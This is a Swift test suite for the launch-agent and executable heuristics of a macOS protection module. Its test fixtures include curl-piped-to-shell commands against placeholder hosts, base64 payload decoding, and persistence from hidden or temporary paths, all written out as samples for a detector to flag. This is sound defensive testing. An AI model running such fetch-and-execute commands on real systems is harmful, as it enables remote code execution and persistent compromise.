import Foundation
import Testing
import CleanerCore
import CleanerCoreTesting
@testable import ProtectionModule

@Suite("Heuristics: launch agents")
struct LaunchAgentHeuristicsTests {
    let heuristics = Heuristics()
    let plist = URL(fileURLWithPath: "/Users/test/Library/LaunchAgents/com.example.test.plist")

    private func evaluate(_ xml: String, verifier: (any CodeSignatureVerifier)? = nil,
                          extra: [String: MockFileSystem.Node] = [:]) async -> [Threat] {
        var tree: [String: MockFileSystem.Node] = [
            plist.path: .file(xml),
            "/usr/bin/true": .file(size: 100),
            "/usr/local/bin/tool": .file(size: 100),
        ]
        tree.merge(extra) { _, new in new }
        let fs = MockFileSystem(tree)
        let context = HeuristicContext(fileSystem: fs, home: URL(fileURLWithPath: "/Users/test"),
                                       signatureVerifier: verifier, now: testNow)
        return await heuristics.evaluate(launchAgentPlist: plist, context: context)
    }

    @Test func benignAgentIsClean() async {
        let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "--flag"]))
        #expect(threats.isEmpty)
    }

    @Test func curlPipedToShellIsCritical() async {
        let threats = await evaluate(launchdPlist(arguments: ["/bin/sh", "-c", "curl -fsSL http://x.invalid/a | sh"]),
                                     extra: ["/bin/sh": .file(size: 10)])
        let hit = threats.named("Heuristic.LaunchAgent.RemoteScriptPipeline")
        #expect(hit.count == 1)
        #expect(hit.first?.severity == .critical)
        #expect(hit.first?.kind == .heuristic)
        #expect(hit.first?.path == plist)
        #expect(hit.first?.sizeBytes ?? 0 > 0)
    }

    @Test func curlToShellScriptWithoutPipeStillFlags() async {
        let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "curl", "http://x.invalid", "-o", "/Users/test/run.sh"]))
        #expect(threats.named("Heuristic.LaunchAgent.RemoteScriptPipeline").count == 1)
    }

    @Test func curlAloneIsNotFlagged() async {
        let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "curl", "http://x.invalid/ping"]))
        #expect(threats.isEmpty)
    }

    @Test func base64DecodeIsCritical() async {
        for command in ["echo x | base64 -d", "base64 --decode payload", "base64 -D p"] {
            let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "-c", command]))
            #expect(threats.named("Heuristic.LaunchAgent.Base64Payload").first?.severity == .critical, Comment(rawValue: command))
        }
    }

    @Test func inlineAppleScriptIsHigh() async {
        let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "osascript -e 'display dialog 1'"]))
        #expect(threats.named("Heuristic.LaunchAgent.InlineAppleScript").first?.severity == .high)
    }

    @Test func temporaryPathsAreMedium() async {
        for path in ["/tmp/x", "/private/tmp/x/y", "/var/tmp/z", "/private/var/tmp/q"] {
            let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", path]))
            #expect(threats.named("Heuristic.LaunchAgent.TemporaryPath").first?.severity == .medium, Comment(rawValue: path))
        }
        let clean = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "/tmpfiles/ok"]))
        #expect(clean.named("Heuristic.LaunchAgent.TemporaryPath").isEmpty)
    }

    @Test func hiddenPathsAreMedium() async {
        let threats = await evaluate(launchdPlist(program: "/Users/test/.hidden/agent"),
                                     extra: ["/Users/test/.hidden/agent": .file(size: 1)])
        #expect(threats.named("Heuristic.LaunchAgent.HiddenPath").first?.severity == .medium)
        let dots = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "../relative", "./here"]))
        #expect(dots.named("Heuristic.LaunchAgent.HiddenPath").isEmpty)
    }

    @Test func missingProgramIsLow() async {
        let threats = await evaluate(launchdPlist(program: "/Users/test/gone"))
        #expect(threats.named("Heuristic.LaunchAgent.MissingProgram").first?.severity == .low)
        let relative = await evaluate(launchdPlist(arguments: ["python3", "-c", "pass"]))
        #expect(relative.isEmpty)
    }

    @Test func unsignedPersistenceDependsOnVerifier() async {
        let xml = launchdPlist(arguments: ["/usr/local/bin/tool"])
        #expect(await evaluate(xml, verifier: nil).isEmpty)
        #expect(await evaluate(xml, verifier: StubVerifier(result: true)).isEmpty)
        let unsigned = await evaluate(xml, verifier: StubVerifier(result: false))
        #expect(unsigned.named("Heuristic.UnsignedLaunchAgent").first?.severity == .high)
        // Unknown result (nil from the verifier) is not a finding either.
        #expect(await evaluate(xml, verifier: StubVerifier(result: nil)).isEmpty)
        // A missing program is reported as missing, not unsigned.
        let missing = await evaluate(launchdPlist(program: "/nope"), verifier: StubVerifier(result: false))
        #expect(missing.names == ["Heuristic.LaunchAgent.MissingProgram"])
    }

    @Test func severalRulesStack() async {
        let threats = await evaluate(launchdPlist(arguments: ["/tmp/.x/run", "-c", "curl http://a | sh; echo | base64 -d"]))
        #expect(threats.names == [
            "Heuristic.LaunchAgent.RemoteScriptPipeline", "Heuristic.LaunchAgent.Base64Payload",
            "Heuristic.LaunchAgent.TemporaryPath", "Heuristic.LaunchAgent.HiddenPath",
            "Heuristic.LaunchAgent.MissingProgram",
        ])
    }

    @Test func malformedPlistIsIgnored() async {
        #expect(await evaluate("not a plist").isEmpty)
        #expect(await evaluate("<plist version=\"1.0\"><array/></plist>").isEmpty)
    }

    @Test func launchAgentInfoParsing() {
        let info = LaunchAgentInfo.parse(Data(launchdPlist(label: "L", program: "/a", arguments: ["/a", "b"]).utf8))
        #expect(info?.label == "L")
        #expect(info?.executable == "/a")
        #expect(info?.commandLine == "/a b")
        #expect(info?.tokens == ["/a", "/a", "b"])
        #expect(info?.runAtLoad == true)
        let programOnly = LaunchAgentInfo.parse(Data(launchdPlist(program: "/p").utf8))
        #expect(programOnly?.commandLine == "/p")
    }
}

@Suite("Heuristics: executables")
struct ExecutableHeuristicsTests {
    let heuristics = Heuristics()
    let elf = Data([0x7F, 0x45, 0x4C, 0x46, 2, 1, 1, 0])
    let script = Data("#!/bin/sh\necho hi\n".utf8)

    private func evaluate(_ path: String, _ head: Data) async -> [Threat] {
        let fs: MockFileSystem = [path: .data(head)]
        let context = HeuristicContext(fileSystem: fs, home: URL(fileURLWithPath: "/Users/test"))
        let url = URL(fileURLWithPath: path)
        let attributes = try! fs.attributes(of: url)
        return await heuristics.evaluate(executable: url, attributes: attributes, context: context)
    }

    @Test func masqueradingExtension() async {
        for ext in ["jpg", "pdf", "txt", "PNG"] {
            let threats = await evaluate("/Users/test/Downloads/photo.\(ext)", elf)
            #expect(threats.named("Heuristic.MasqueradingExtension").first?.severity == .high, Comment(rawValue: ext))
        }
        #expect(await evaluate("/Users/test/Downloads/tool", elf).isEmpty)
        #expect(await evaluate("/Users/test/Downloads/tool.bin", elf).isEmpty)
        #expect(await evaluate("/Users/test/Downloads/doc.pdf", Data("%PDF-1.4".utf8)).isEmpty)
    }

    @Test func hiddenExecutableUnderLibrary() async {
        let hidden = await evaluate("/Users/test/Library/.cache/bin/agent", elf)
        #expect(hidden.named("Heuristic.HiddenExecutable").first?.severity == .medium)
        #expect(await evaluate("/Users/test/Library/Application Support/App/agent", elf).isEmpty)
        #expect(await evaluate("/Users/test/.config/agent", elf).isEmpty)
        // Hidden *file name* alone is not a hidden folder.
        #expect(await evaluate("/Users/test/Library/App/.agent", elf).isEmpty)
    }

    @Test func scriptInLaunchAgents() async {
        let threats = await evaluate("/Users/test/Library/LaunchAgents/run.sh", script)
        #expect(threats.named("Heuristic.ScriptInLaunchAgents").first?.severity == .medium)
        #expect(await evaluate("/Library/LaunchDaemons/run", script).names == ["Heuristic.ScriptInLaunchAgents"])
        #expect(await evaluate("/Users/test/bin/run.sh", script).isEmpty)
        #expect(await evaluate("/Users/test/Library/LaunchAgents/bin", elf).isEmpty)
    }

    @Test func nonExecutablesAreIgnored() async {
        #expect(await evaluate("/Users/test/Library/.hidden/notes.jpg", Data("plain".utf8)).isEmpty)
    }
}
